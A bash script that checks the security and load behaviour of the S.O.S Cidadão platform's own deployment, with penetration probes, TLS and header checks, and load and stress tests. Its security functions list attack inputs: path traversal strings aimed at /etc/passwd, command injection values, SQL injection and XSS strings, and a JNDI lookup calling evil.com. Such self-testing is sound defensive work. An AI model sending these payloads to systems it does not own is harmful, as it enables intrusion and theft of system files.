#!/bin/bash

# Security and Performance Validation Script for S.O.S Cidadão Platform
# Runs comprehensive security scans and performance tests

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DEPLOYMENT_URL=""
TEST_DURATION=300  # 5 minutes for performance tests
CONCURRENT_USERS=50
SECURITY_SCAN_ENABLED=true
PERFORMANCE_TEST_ENABLED=true

# Test results tracking
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
FAILED_TEST_NAMES=()

# Function to log messages
log_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

log_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

log_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

log_error() {
    echo -e "${RED}❌ $1${NC}"
}

# Function to run test suite
run_test_suite() {
    local test_name=$1
    local test_command=$2
    
    echo -e "\n${BLUE}🧪 Running: $test_name${NC}"
    echo "----------------------------------------"
    
    ((TOTAL_TESTS++))
    
    if eval "$test_command"; then
        log_success "$test_name: PASSED"
        ((PASSED_TESTS++))
    else
        log_error "$test_name: FAILED"
        ((FAILED_TESTS++))
        FAILED_TEST_NAMES+=("$test_name")
    fi
}

# Function to check prerequisites
check_prerequisites() {
    log_info "Checking prerequisites for security and performance testing..."
    
    # Check required tools
    local required_tools=("python3" "pip" "curl" "jq")
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            log_error "$tool is required but not installed"
            exit 1
        fi
    done
    
    # Check Python packages
    local required_packages=("pytest" "requests" "psutil")
    
    for package in "${required_packages[@]}"; do
        if ! python3 -c "import $package" >/dev/null 2>&1; then
            log_error "Python package $package is required but not installed"
            log_info "Install with: pip install $package"
            exit 1
        fi
    done
    
    # Check optional security tools
    if command -v nmap >/dev/null 2>&1; then
        log_success "nmap found - network scanning available"
    else
        log_warning "nmap not found - network scanning will be skipped"
    fi
    
    if command -v nikto >/dev/null 2>&1; then
        log_success "nikto found - web vulnerability scanning available"
    else
        log_warning "nikto not found - web vulnerability scanning will be skipped"
    fi
    
    log_success "Prerequisites check completed"
}

# Function to setup test environment
setup_test_environment() {
    log_info "Setting up security and performance test environment..."
    
    # Load environment variables
    if [ -f ".env" ]; then
        source .env
    fi
    
    # Set deployment URL
    if [ -z "$DEPLOYMENT_URL" ]; then
        DEPLOYMENT_URL=${VERCEL_URL:-"http://localhost:5000"}
    fi
    
    # Ensure URL has protocol
    if [[ ! $DEPLOYMENT_URL =~ ^https?:// ]]; then
        DEPLOYMENT_URL="http://$DEPLOYMENT_URL"
    fi
    
    log_info "Testing deployment: $DEPLOYMENT_URL"
    
    # Verify deployment is accessible
    if ! curl -f "$DEPLOYMENT_URL/api/health" >/dev/null 2>&1; then
        log_error "Deployment not accessible at $DEPLOYMENT_URL"
        exit 1
    fi
    
    log_success "Test environment setup completed"
}

# Security Testing Functions

run_security_tests() {
    if [ "$SECURITY_SCAN_ENABLED" != "true" ]; then
        log_info "Security testing disabled"
        return 0
    fi
    
    echo -e "\n${BLUE}🔒 Running Security Validation Tests${NC}"
    echo "===================================="
    
    # Run Python security tests
    run_test_suite "Security Validation Tests" "python3 -m pytest tests/integration/test_security_validation.py -v --tb=short"
    
    # Run basic penetration tests
    run_basic_penetration_tests
    
    # Run SSL/TLS security check
    run_ssl_security_check
    
    # Run header security check
    run_header_security_check
    
    # Run OWASP security checks
    run_owasp_security_checks
}

run_basic_penetration_tests() {
    log_info "Running basic penetration tests..."
    
    local base_url="$DEPLOYMENT_URL"
    
    # Test 1: Directory traversal
    log_info "Testing directory traversal vulnerabilities..."
    local traversal_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    )
    
    for payload in "${traversal_payloads[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$base_url/api/$payload" || echo "000")
        if [ "$response" = "200" ]; then
            log_error "Potential directory traversal vulnerability detected with payload: $payload"
            return 1
        fi
    done
    
    # Test 2: Command injection
    log_info "Testing command injection vulnerabilities..."
    local command_payloads=(
        "; ls -la"
        "| whoami"
        "&& cat /etc/passwd"
        "; ping -c 1 127.0.0.1"
    )
    
    for payload in "${command_payloads[@]}"; do
        response=$(curl -s "$base_url/api/health?test=$payload" || echo "")
        if echo "$response" | grep -q "root\|admin\|bin\|daemon"; then
            log_error "Potential command injection vulnerability detected"
            return 1
        fi
    done
    
    log_success "Basic penetration tests passed"
    return 0
}

run_ssl_security_check() {
    if [[ ! $DEPLOYMENT_URL =~ ^https:// ]]; then
        log_warning "SSL/TLS check skipped - not using HTTPS"
        return 0
    fi
    
    log_info "Checking SSL/TLS security configuration..."
    
    local hostname=$(echo "$DEPLOYMENT_URL" | sed 's|https\?://||' | sed 's|/.*||')
    
    # Check SSL certificate
    if command -v openssl >/dev/null 2>&1; then
        local ssl_info
        ssl_info=$(echo | openssl s_client -connect "$hostname:443" -servername "$hostname" 2>/dev/null | openssl x509 -noout -dates 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            log_success "SSL certificate is valid"
            
            # Check certificate expiration
            local not_after
            not_after=$(echo "$ssl_info" | grep "notAfter" | cut -d= -f2)
            if [ ! -z "$not_after" ]; then
                log_info "SSL certificate expires: $not_after"
            fi
        else
            log_error "SSL certificate validation failed"
            return 1
        fi
    else
        log_warning "OpenSSL not available - SSL check skipped"
    fi
    
    return 0
}

run_header_security_check() {
    log_info "Checking security headers..."
    
    local headers
    headers=$(curl -s -I "$DEPLOYMENT_URL" || echo "")
    
    # Check for security headers
    local security_headers=(
        "X-Content-Type-Options"
        "X-Frame-Options"
        "X-XSS-Protection"
        "Referrer-Policy"
    )
    
    local missing_headers=()
    
    for header in "${security_headers[@]}"; do
        if ! echo "$headers" | grep -qi "$header"; then
            missing_headers+=("$header")
        fi
    done
    
    if [ ${#missing_headers[@]} -eq 0 ]; then
        log_success "All security headers present"
        return 0
    else
        log_warning "Missing security headers: ${missing_headers[*]}"
        return 0  # Warning, not failure
    fi
}

run_owasp_security_checks() {
    log_info "Running OWASP security checks..."
    
    # Check for common OWASP Top 10 vulnerabilities
    local base_url="$DEPLOYMENT_URL"
    
    # A01: Broken Access Control
    log_info "Checking for broken access control..."
    local admin_endpoints=(
        "/api/admin"
        "/api/config"
        "/api/debug"
        "/api/internal"
        "/api/system"
    )
    
    for endpoint in "${admin_endpoints[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$base_url$endpoint" || echo "000")
        if [ "$response" = "200" ]; then
            log_warning "Potentially exposed admin endpoint: $endpoint"
        fi
    done
    
    # A03: Injection
    log_info "Checking for injection vulnerabilities..."
    local injection_payloads=(
        "' OR '1'='1"
        "<script>alert('xss')</script>"
        "${jndi:ldap://evil.com/a}"
    )
    
    for payload in "${injection_payloads[@]}"; do
        response=$(curl -s "$base_url/api/health?test=$payload" || echo "")
        if echo "$response" | grep -q "error\|exception\|stack"; then
            log_warning "Potential injection vulnerability detected"
        fi
    done
    
    log_success "OWASP security checks completed"
    return 0
}

# Performance Testing Functions

run_performance_tests() {
    if [ "$PERFORMANCE_TEST_ENABLED" != "true" ]; then
        log_info "Performance testing disabled"
        return 0
    fi
    
    echo -e "\n${BLUE}⚡ Running Performance Validation Tests${NC}"
    echo "======================================"
    
    # Run Python performance tests
    run_test_suite "Performance Validation Tests" "python3 -m pytest tests/integration/test_performance_validation.py -v --tb=short"
    
    # Run load testing
    run_load_tests
    
    # Run stress testing
    run_stress_tests
    
    # Run response time analysis
    run_response_time_analysis
}

run_load_tests() {
    log_info "Running load tests..."
    
    local base_url="$DEPLOYMENT_URL"
    local endpoint="$base_url/api/health"
    local duration=$TEST_DURATION
    local concurrent_users=$CONCURRENT_USERS
    
    # Create load test script
    cat > /tmp/load_test.py << EOF
import requests
import time
import threading
import statistics
from concurrent.futures import ThreadPoolExecutor
import sys

def make_request(url):
    try:
        start_time = time.time()
        response = requests.get(url, timeout=10)
        end_time = time.time()
        return {
            'status_code': response.status_code,
            'response_time': end_time - start_time,
            'success': response.status_code == 200
        }
    except Exception as e:
        return {
            'status_code': 0,
            'response_time': 0,
            'success': False,
            'error': str(e)
        }

def run_load_test(url, duration, concurrent_users):
    print(f"Running load test: {concurrent_users} concurrent users for {duration}s")
    
    results = []
    start_time = time.time()
    
    def worker():
        while time.time() - start_time < duration:
            result = make_request(url)
            results.append(result)
            time.sleep(0.1)  # Small delay between requests
    
    with ThreadPoolExecutor(max_workers=concurrent_users) as executor:
        futures = [executor.submit(worker) for _ in range(concurrent_users)]
        
        # Wait for completion
        for future in futures:
            future.result()
    
    # Analyze results
    successful_requests = [r for r in results if r['success']]
    failed_requests = [r for r in results if not r['success']]
    
    total_requests = len(results)
    success_rate = len(successful_requests) / total_requests if total_requests > 0 else 0
    
    if successful_requests:
        response_times = [r['response_time'] for r in successful_requests]
        avg_response_time = statistics.mean(response_times)
        p95_response_time = statistics.quantiles(response_times, n=20)[18] if len(response_times) > 20 else max(response_times)
        throughput = len(successful_requests) / duration
    else:
        avg_response_time = 0
        p95_response_time = 0
        throughput = 0
    
    print(f"Load Test Results:")
    print(f"  Total requests: {total_requests}")
    print(f"  Successful requests: {len(successful_requests)}")
    print(f"  Failed requests: {len(failed_requests)}")
    print(f"  Success rate: {success_rate:.2%}")
    print(f"  Average response time: {avg_response_time:.3f}s")
    print(f"  95th percentile response time: {p95_response_time:.3f}s")
    print(f"  Throughput: {throughput:.1f} requests/second")
    
    # Return success if performance is acceptable
    if success_rate >= 0.95 and avg_response_time < 2.0:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    run_load_test("$endpoint", $duration, $concurrent_users)
EOF
    
    # Run load test
    if python3 /tmp/load_test.py; then
        log_success "Load test passed"
        rm -f /tmp/load_test.py
        return 0
    else
        log_error "Load test failed"
        rm -f /tmp/load_test.py
        return 1
    fi
}

run_stress_tests() {
    log_info "Running stress tests..."
    
    local base_url="$DEPLOYMENT_URL"
    
    # Test with increasing load
    local stress_levels=(10 25 50 100)
    
    for level in "${stress_levels[@]}"; do
        log_info "Testing stress level: $level concurrent requests"
        
        # Create temporary stress test
        local success_count=0
        local total_count=$level
        
        for ((i=1; i<=level; i++)); do
            if curl -s -f "$base_url/api/health" >/dev/null 2>&1; then
                ((success_count++))
            fi &
        done
        
        # Wait for all background jobs
        wait
        
        local success_rate=$((success_count * 100 / total_count))
        
        log_info "Stress level $level: $success_rate% success rate"
        
        if [ $success_rate -lt 80 ]; then
            log_warning "System stressed at $level concurrent requests"
            break
        fi
        
        sleep 2  # Cool down between stress levels
    done
    
    log_success "Stress testing completed"
    return 0
}

run_response_time_analysis() {
    log_info "Running response time analysis..."
    
    local base_url="$DEPLOYMENT_URL"
    local endpoints=(
        "/api/health"
        "/api"
        "/api/notifications"
    )
    
    for endpoint in "${endpoints[@]}"; do
        log_info "Testing response time for $endpoint"
        
        local times=()
        local url="$base_url$endpoint"
        
        # Make multiple requests to get average
        for ((i=1; i<=10; i++)); do
            local start_time=$(date +%s%N)
            
            if curl -s -f "$url" >/dev/null 2>&1; then
                local end_time=$(date +%s%N)
                local response_time=$(( (end_time - start_time) / 1000000 ))  # Convert to milliseconds
                times+=($response_time)
            fi
            
            sleep 0.5
        done
        
        if [ ${#times[@]} -gt 0 ]; then
            # Calculate average
            local sum=0
            for time in "${times[@]}"; do
                sum=$((sum + time))
            done
            local avg_time=$((sum / ${#times[@]}))
            
            log_info "$endpoint average response time: ${avg_time}ms"
            
            if [ $avg_time -gt 2000 ]; then
                log_warning "$endpoint response time is slow: ${avg_time}ms"
            fi
        else
            log_error "No successful requests to $endpoint"
        fi
    done
    
    return 0
}

# Function to generate comprehensive report
generate_comprehensive_report() {
    echo -e "\n${BLUE}📊 Security and Performance Validation Report${NC}"
    echo "=============================================="
    echo -e "Deployment URL: $DEPLOYMENT_URL"
    echo -e "Test Duration: $TEST_DURATION seconds"
    echo -e "Concurrent Users: $CONCURRENT_USERS"
    echo -e "Validation Time: $(date)"
    echo -e "Total Test Suites: $TOTAL_TESTS"
    echo -e "${GREEN}Passed: $PASSED_TESTS${NC}"
    echo -e "${RED}Failed: $FAILED_TESTS${NC}"
    
    if [ $FAILED_TESTS -gt 0 ]; then
        echo -e "\n${RED}Failed Test Suites:${NC}"
        for test_name in "${FAILED_TEST_NAMES[@]}"; do
            echo -e "  - $test_name"
        done
    fi
    
    # Calculate success rate
    if [ $TOTAL_TESTS -gt 0 ]; then
        local success_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
        echo -e "\nSuccess Rate: $success_rate%"
        
        if [ $success_rate -eq 100 ]; then
            echo -e "${GREEN}🎉 All security and performance validations passed!${NC}"
            echo -e "${GREEN}✅ System is ready for production deployment.${NC}"
        elif [ $success_rate -ge 80 ]; then
            echo -e "${YELLOW}⚠️  Most validations passed, but some issues need attention.${NC}"
            echo -e "${YELLOW}🔧 Please review failed tests before production deployment.${NC}"
        else
            echo -e "${RED}❌ Significant validation failures detected.${NC}"
            echo -e "${RED}🚫 Production deployment not recommended until issues are resolved.${NC}"
        fi
    fi
    
    # Security recommendations
    echo -e "\n${BLUE}🔒 Security Recommendations:${NC}"
    echo -e "  - Ensure all security headers are properly configured"
    echo -e "  - Regularly update dependencies and scan for vulnerabilities"
    echo -e "  - Implement proper rate limiting and DDoS protection"
    echo -e "  - Monitor for suspicious activities and security events"
    echo -e "  - Conduct regular security audits and penetration testing"
    
    # Performance recommendations
    echo -e "\n${BLUE}⚡ Performance Recommendations:${NC}"
    echo -e "  - Monitor response times and set up alerting for degradation"
    echo -e "  - Implement caching strategies for frequently accessed data"
    echo -e "  - Optimize database queries and add appropriate indexes"
    echo -e "  - Consider CDN for static assets and global distribution"
    echo -e "  - Plan for horizontal scaling based on load patterns"
}

# Main execution function
main() {
    echo -e "${BLUE}S.O.S Cidadão Platform - Security and Performance Validation${NC}"
    echo -e "============================================================="
    echo ""
    
    # Check prerequisites
    check_prerequisites
    
    # Setup test environment
    setup_test_environment
    
    # Run security tests
    run_security_tests
    
    # Run performance tests
    run_performance_tests
    
    # Generate comprehensive report
    generate_comprehensive_report
    
    # Exit with appropriate code
    if [ $FAILED_TESTS -eq 0 ]; then
        exit 0
    else
        exit 1
    fi
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --url)
            DEPLOYMENT_URL="$2"
            shift 2
            ;;
        --duration)
            TEST_DURATION="$2"
            shift 2
            ;;
        --concurrent-users)
            CONCURRENT_USERS="$2"
            shift 2
            ;;
        --security-only)
            PERFORMANCE_TEST_ENABLED=false
            shift
            ;;
        --performance-only)
            SECURITY_SCAN_ENABLED=false
            shift
            ;;
        --help|-h)
            echo "Security and Performance Validation Script"
            echo ""
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  --url URL                 Deployment URL to test"
            echo "  --duration SECONDS        Performance test duration (default: 300)"
            echo "  --concurrent-users NUM    Number of concurrent users (default: 50)"
            echo "  --security-only           Run only security tests"
            echo "  --performance-only        Run only performance tests"
            echo "  --help, -h                Show this help message"
            echo ""
            echo "Environment Variables:"
            echo "  DEPLOYMENT_URL            Deployment URL to test"
            echo "  VERCEL_URL                Vercel deployment URL"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

# Run main function
main